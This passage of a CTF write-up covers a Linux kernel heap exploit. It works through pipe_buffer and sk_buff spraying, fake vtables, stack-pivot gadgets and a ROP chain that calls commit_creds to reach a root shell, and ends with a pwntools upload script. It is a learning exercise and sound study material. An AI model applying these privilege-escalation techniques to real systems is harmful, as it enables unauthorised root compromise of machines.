I found lots of resources on how to exploit `tty_struct` for RIP control. Below is the struct layout:

```c
struct tty_struct {
	struct kref kref;
	int index;
	struct device *dev;
	struct tty_driver *driver;
	struct tty_port *port;
	const struct tty_operations *ops;

    // ...
} __randomize_layout
```

(bruh why is there `__randomize_layout`, doesn't that mess up the ordering of the struct??)

As we can see, our target is `tty_struct.ops`, which we need to craft a fake vtable for.

```c
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct file *filp, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	ssize_t (*write)(struct tty_struct *tty, const u8 *buf, size_t count);
	int  (*put_char)(struct tty_struct *tty, u8 ch);
	void (*flush_chars)(struct tty_struct *tty);
	unsigned int (*write_room)(struct tty_struct *tty);
	unsigned int (*chars_in_buffer)(struct tty_struct *tty);
	int  (*ioctl)(struct tty_struct *tty,
		    unsigned int cmd, unsigned long arg);
	long (*compat_ioctl)(struct tty_struct *tty,
			     unsigned int cmd, unsigned long arg);
    // ...
} __randomize_layout;
```

I didn't actually write an exploit for this, but at first glance it seems possible. In my exploit, I targeted
`pipe_buffer` for RIP control instead.

(edit: Kaligula mentioned that `tty_struct` is allocated using `GFP_KERNEL`, so it's actually not possible)

### `pipe_buffer`

```c
struct pipe_buffer {
	struct page *page;
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};

struct pipe_buf_operations {
	int (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);
	void (*release)(struct pipe_inode_info *, struct pipe_buffer *);
	bool (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);
	bool (*get)(struct pipe_inode_info *, struct pipe_buffer *);
};
```

This struct is a lot simpler and smaller.

And we can see it being allocated here:

```c
struct pipe_inode_info *alloc_pipe_info(void)
{
	struct pipe_inode_info *pipe;
	unsigned long pipe_bufs = PIPE_DEF_BUFFERS;
	struct user_struct *user = get_current_user();
	unsigned long user_bufs;
	unsigned int max_size = READ_ONCE(pipe_max_size);

	pipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);
	if (pipe == NULL)
		goto out_free_uid;

	if (pipe_bufs * PAGE_SIZE > max_size && !capable(CAP_SYS_RESOURCE))
		pipe_bufs = max_size >> PAGE_SHIFT;

	user_bufs = account_pipe_buffers(user, 0, pipe_bufs);

	if (too_many_pipe_buffers_soft(user_bufs) && pipe_is_unprivileged_user()) {
		user_bufs = account_pipe_buffers(user, pipe_bufs, PIPE_MIN_DEF_BUFFERS);
		pipe_bufs = PIPE_MIN_DEF_BUFFERS;
	}

	if (too_many_pipe_buffers_hard(user_bufs) && pipe_is_unprivileged_user())
		goto out_revert_acct;

	pipe->bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer),
			     GFP_KERNEL_ACCOUNT);
    // ...
}
```

We see that it's allocated with `GFP_KERNEL_ACCOUNT`. For some reason, the size is `1k` despite the small size of the
struct, but anyway this means the cache page is `kmalloc-cg-1k`. So, we should try and pivot our UAF to this cache page.

But how to leak this struct's address after allocation? This is where `msg_msg` comes into play again. Right now, we've
used up `cg_256_msg_msg.fd` and `cg_512_msg_msg.fd` to obtain addresses for the chemical linked list. However, we
actually haven't used either `cg_256_msg_msg.bk` or `cg_1k_msg_msg.fd`. First things first, to separate our 3rd fake
chemical (which uses `kmalloc-cg-1k` already) from our target struct, we should change the 3rd chemical's cache to
`kmalloc-cg-2k` to avoid any potential overlap.  Then, we can spray `kmalloc-cg-1k` with `msg_msg` before the spray for
`kmalloc-cg-256`, such that `cg_256_msg_msg.bk` will point to `kmalloc-cg-1k`, thus giving us our leak. Then, we can fix
the attacker chemical with the leaked address at `note_addr`. Lastly, we spray `pipe_buf` on `kmalloc-cg-1k`, allowing
us to reclaim the address we leaked.

So this is our new linked list:

![Linked list 1](@images/2024/lnc-2024/free-list-1.png)

When `attacker` is freed, it will also free the `pipe_buf` object, which we can then reallocate with some other struct,
possibly overwriting `pipe_buffer.ops` with a fake vtable address.

## Step 5: RIP control via overlap

Now we can almost exploit our new arbitrary free to control RIP by overwriting `pipe_buffer.ops`. Can we still use
`msg_msg` to achieve this?

### `msg_msg` again

```

(no idea why all the fields for `pipe_buf` are left as nulled after the `kcalloc()` - shouldn't some fields be
initialized? maybe i need to trigger some operations to setup fields...)

Anyway, we see that `pipe_buf.ops` actually aligns nicely with `msg_msg.mtype`. Since we can control `mtype`, can't we
use this to control `pipe_buf.ops` and win? 

Unfortunately, not quite for 2 reasons. Firstly, when I tried to trigger the RIP control by releasing the `pipe_buf`, it
seems that it sees the other fields in `msg_msg` like `msg_msg.fd`, `msg_msg.bk` and so on, and tries to free them,
before calling `pipe_buf.ops->release`. I don't exactly know where this code is, but what seems to happen is it attempts
to read and store the address to `release` somewhere without calling it, then does a few frees which crashes the kernel
due to detected double free, before `release` is actually called. Secondly, even if the initial exploit worked, for our
ROP chain later, because of gadget constraints, our stack will end up pointing to top of `pipe_buf` object
(`msg_msg.fd`), which we have no control over. Then the ROP chain will crash because `msg_msg.fd` is not pointing to a
valid instruction address.

### `chemical.note`

At this point, I turned back to the chemical note and how it's stored using `GFP_KERNEL_ACCOUNT`, making it appear in
`cg` cache. I have complete control over the entire note as well! Isn't this exactly what I want? So I went down this
path for a while too.

However, it turns out I neglected to consider that the max size of a note is `100`, as seen in `DO_CREATE`. So we can't
actually create a note in `kmalloc-cg-1k`.

### `sk_buff`

After researching more, I realize that `sk_buff` (or more precisely, `sk_buff.head`) is very commonly used to attack
`pipe_buf` because of its unique structure. Here's what it looks like:

```c
struct sk_buff {
    /* unimportant headers ... */
    /* ... */
	/* end headers group */

	/* These elements must be at the end, see alloc_skb() for details.  */
	sk_buff_data_t		tail;
	sk_buff_data_t		end;
	unsigned char		*head,
				*data;
	unsigned int		truesize;
	refcount_t		users;

#ifdef CONFIG_SKB_EXTENSIONS
	/* only useable after checking ->active_extensions != 0 */
	struct skb_ext		*extensions;
#endif
};

/*
 * &sk_buff.head points to the main "head" buffer. The head buffer is divided
 * into two parts:
 *
 *  - data buffer, containing headers and sometimes payload;
 *    this is the part of the skb operated on by the common helpers
 *    such as skb_put() or skb_pull();
 *  - shared info (struct skb_shared_info) which holds an array of pointers
 *    to read-only data in the (page, offset, length) format.
 */
```

I couldn't find the allocate code for `sk_buff.head`, but it is allocated in `kmalloc-cg-1k` as well. The unique thing
about this struct is that the user input actually appears at the top of the struct, while metadata is found at the
bottom. This is really useful for our `pipe_buf` overwrite, since `pipe_buf` metadata is found at the top of its struct,
so we can overwrite the metadata of `pipe_buf` easily!

To initialize an `sk_buff` and write data to head:

```c
char payload[1024 - 320];
int sk_socket[2];
socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket);
write(sk_socket[0], payload, sizeof(payload));
```

Now, we can spray and allocate `sk_buff.head` over `pipe_buf`, overwriting `pipe_buf.ops` to our desired vtable. We can
put the fake vtable inside `sk_buff.head` as well, since we already know its address from `kmalloc-cg-1k` kheap leak.

## Step 6: ROP chain

Now that our `pipe_buf` is set up, we can start planning our ROP chain to priv escalate! We will be using `ops.release`
to control RIP, which is called when `pipe_buf` is closed. 

```c
void (*release)(struct pipe_inode_info *, struct pipe_buffer *);
```

As we can see, the second argument to `release`, in `rsi`, will be the address of the `pipe_buf` that we're freeing.
Thus, `rsi` is quite a good register to focus on to stack pivot, since we can control the contents of the address at
which it's pointing to. This is why we can't use `msg_msg` and need to use `sk_buff` instead, because we don't have
control over the start of `msg_msg` and thus can't make a good fake stack.

### Stack pivot 1

Let's find a good stack pivot gadget first. Gadgets that end with `ret` are not suitable, because our stack isn't setup
yet, so we can't ROP properly. `call` or `jmp` on a register we control like `rsi` are the best.

```
0xffffffff81556dc6 : push rsi ; jmp qword ptr [rsi + 0x39]
0xffffffff81602195 : push rsi ; jmp qword ptr [rsi - 0x7d]
0xffffffff81602d23 : push rsi ; jmp qword ptr [rsi - 0x7f]
```

There are actually a lot more suitable gadgets, but these are the most straightforward. `[rsi + 0x39]` is under our
control, so we can put a second gadget there. The point of `push rsi` is to put a pointer we control at the top of the
original stack, so our second gadget can simply be `pop rsp` which will change `rsp` to the saved value of `rsi`, and
complete the stack pivot.

```
0xffffffff81135dff : pop rsp ; ret
```

### Stack pivot 2

Let's take a step back and look at our current `sk_buff/pipe_buf` object:

```
gef> x/200gx 0xffff8881026ca400
0xffff8881026ca400:     0x0000000000000000      0x0000000000000000
0xffff8881026ca410:     0xffff8881026ca690      0x0000000000000000
0xffff8881026ca420:     0x0000000000000000      0x0000000000000000
0xffff8881026ca430:     0x0000000000000000      0xffffff81135dff00 // +0x39
0xffff8881026ca440:     0x00000000000000ff      0x0000000000000000
...
0xffff8881026ca690:     0x0000000000000000      0xffffffff81556dc6 // +0x290
0xffff8881026ca6a0:     0x0000000000000000      0x0000000000000000
```

After pivoting stack to `+0x00`, the program will read the next ROP gadget from `+0x00`, and continue sequentially from
there. We don't have a lot of space on this new stack, because at `+0x10`, the pointer to our vtable is still there, and
at `+0x39`, we put the gadget called in `jmp qword ptr [rsi + 0x39]`, and we must remember not to overwrite these while
writing our final ROP chain. The best solution to avoid conflict with these pointers is to pivot once more, now to
somewhere further down the stack where we have more space. Luckily, we should have enough space to do this, and we'll do
the stack pivot at `+0x18`. To get past `+0x10`, we can do a small trick: just `pop rdi`!

So our first stack will look like this:

```
+0x00: ret ;
+0x08: pop rdi ; ret ;
+0x10: <fake vtable>
+0x18: pop rsp ; ret ;
+0x20: <pipe_buf + 0x50>
```

Now our second stack will point to `+0x50`. Here we have lots of space, so let's start our final ROP chain!

### Final ROP chain

We want to finally call this:

```c
commit_creds(prepare_kernel_cred(&init_task));
```

Due to recent changes in kernel, it's no longer `prepare_kernel_cred(0)` as seen in older writeups.

Then because of KPTI, we need to jump to our shell function safely. In this version of kernel, the usual gadget
`swapgs_restore_regs_and_return_to_usermode+22` is slightly different, so I can't really use it. So we need `swapgs ;
ret` and `iretq ; ret` gadgets. ROPgadget couldn't locate these, but I used `objdump -d vmlinux` to find them. 

Also, I don't actually know how to return properly to userland from `iretq` cos I keep getting SIGSEGV (after
successfully pivoting back to userland). But another way is simply to register a SIGSEGV handler in our program and set
it to `get_shell`.

One more part: we need to actually save the state of the program even before doing our ROP, so at the start of the
exploit we add this (and also define our `get_shell` function):

```c
void save_state() {
  __asm__(
      ".intel_syntax noprefix;"
      "mov user_cs, cs;"
      "mov user_ss, ss;"
      "mov user_sp, rsp;"
      "pushf;"
      "pop user_rflags;"
      ".att_syntax;"
  );
}
save_state();

void get_shell() {
  if (getuid() == 0) {
    system("/bin/sh");
  } else {
    puts("[-] failed to get root");
  }
}
```

Lastly, our second stack:

```
+0x50: pop rdi ; ret ;
+0x58: <init_task>
+0x60: prepare_kernel_cred
+0x68: commit_creds
+0x70: swapgs ; ret ;
+0x78: iretq ; ret ;
+0x80: get_shell
+0x88: user_cs
+0x90: user_rflags
+0x98: user_sp
+0xa0: user_ss
```

After constructing this, we spray `sk_buff` onto `pipe_buf`, release all `pipe_buf` and should get root!

I compiled it with `musl-gcc -static -o exploit exploit.c`.

Then, I used the following script to send the binary to remote:

```py
from pwn import *

p = remote("localhost", 1337)

p.sendlineafter(b"$", b"cd /tmp")

with open("./base64-exploit.txt", "r") as f:
    exploit = f.readlines()

p.sendlineafter(b"$", b"touch expl")

for line in exploit:
    p.sendlineafter(b"$", f"echo \"{line.strip()}\" >> expl".encode())

p.sendlineafter(b"$", b"base64 -d expl > exploit; chmod +x exploit")

p.interactive()
```

Note: I ran it with `python3 solve.py NOTERM` because the VM would output annoying carriage returns that cleared the
output.

## Conclusion

I really loved solving this challenge and learnt a lot from it. Kernel pwn has a much larger scope than regular pwn
because of the sheer number of structs we can now exploit, and the complexity of our final target not just being
`system("/bin/sh")` thus requiring a ROP chain and stack pivot. And because of the larger scope, I think it'll be very
useful to have a collection of kernel structs, including their layout, `kmalloc` cache, initialization, usage and
freeing, and how they can interact and synergize with other structs (like `pipe_buf` and `sk_buff`!). I found this to be
the main obstacle in solving the challenge during the CTF, because of my lack of knowledge of and experience with kernel
pwn. If I have the time and expertise, I may start to compile this and post it on my blog as well.
